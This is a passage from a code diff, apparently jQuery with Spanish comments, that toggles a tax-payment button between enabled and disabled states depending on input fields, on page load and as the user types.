+                $("#btn-pagar-impuestos").prop("disabled", true);
+                $("#btn-pagar-impuestos").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        toggleButton();
+
+        // Ejecutar la función al escribir en los inputs
+        $(".entradas").on("input", toggleButton);
+    }); 
